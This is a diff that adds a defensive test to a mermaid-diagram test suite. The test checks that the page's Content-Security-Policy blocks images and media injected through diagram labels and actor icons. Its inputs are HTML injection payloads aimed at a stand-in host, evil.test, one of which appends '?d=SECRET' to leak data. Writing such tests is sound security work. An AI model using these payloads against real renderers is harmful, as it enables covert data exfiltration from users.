@@ -300,6 +300,53 @@ describe("A mermaid diagram in a reply", () => {
     }
   });
 
+  // Math labels keep their raw HTML and d3 draws an actor's icon, both before `contained` runs, so only the page
+  // policy in index.html stands between these elements and a request (#465).
+  it("puts nothing into the page while it draws that the page policy would let load", { timeout: LONG }, async () => {
+    const policy = (readFileSync("index.html", "utf8") as string).match(/Content-Security-Policy"\s+content="([^"]*)"/)![1];
+    const sourcesFor = (directive: string) => policy.split(";").map((d) => d.trim().split(/\s+/)).find(([name]) => name === directive)?.slice(1);
+    const allows = (directive: "img-src" | "media-src", url: string) => {
+      const sources = sourcesFor(directive) ?? sourcesFor("default-src");
+      if (!sources) return true;
+      const target = new URL(url, location.href);
+      return sources.some((s) => (s === "'self'" ? target.origin === location.origin : s.endsWith(":") && target.protocol === s));
+    };
+    const urls = (el: Element, attribute: string) =>
+      (attribute === "srcset" ? (el.getAttribute(attribute) ?? "").split(",").map((c) => c.trim().split(/\s+/)[0]) : [el.getAttribute(attribute) ?? ""]).filter(Boolean);
+    const loads: [string, "img-src" | "media-src", string[]][] = [
+      ["img, picture source, input[type=image]", "img-src", ["src", "srcset"]],
+      ["video", "img-src", ["poster"]],
+      ["audio, video, audio source, video source", "media-src", ["src"]],
+      ["image", "img-src", ["href", "xlink:href"]],
+    ];
+    const letThrough = new Set<string>();
+    const watch = new MutationObserver((records) =>
+      records.forEach((r) =>
+        r.addedNodes.forEach((n) => {
+          if (!(n instanceof Element)) return;
+          for (const el of [n, ...n.querySelectorAll("*")])
+            for (const [selector, directive, attributes] of loads)
+              if (el.matches(selector))
+                for (const attribute of attributes) for (const url of urls(el, attribute)) if (allows(directive, url)) letThrough.add(`${el.localName} ${attribute}=${url}`);
+        }),
+      ),
+    );
+    watch.observe(document.documentElement, { subtree: true, childList: true });
+    try {
+      const message = (html: string) => `sequenceDiagram\n  participant A\n  participant B\n  A->>B: $$x$$ ${html}`;
+      await drawnAfter([
+        message("<img src=https://evil.test/m.png?d=SECRET>"),
+        'sequenceDiagram\n  participant A\n  participant B\n  properties A: {"class": "internal-service-actor", "icon": "https://evil.test/icon.png"}\n  A->>B: hi',
+        message("<video poster=https://evil.test/poster.png></video><audio src=https://evil.test/a.mp3 preload=auto></audio>"),
+        message("<picture><source srcset=https://evil.test/p.png><img></picture>"),
+        message("<input type=image src=https://evil.test/i.png>"),
+      ]);
+      expect([...letThrough]).toEqual([]);
+    } finally {
+      watch.disconnect();
+    }
+  });
+
   it("locks every setting mermaid takes, so no diagram can change one", async () => {
     const { UNDEFAULTED_SETTINGS } = await import("./mermaid");
     const { default: mermaid } = await import("mermaid");
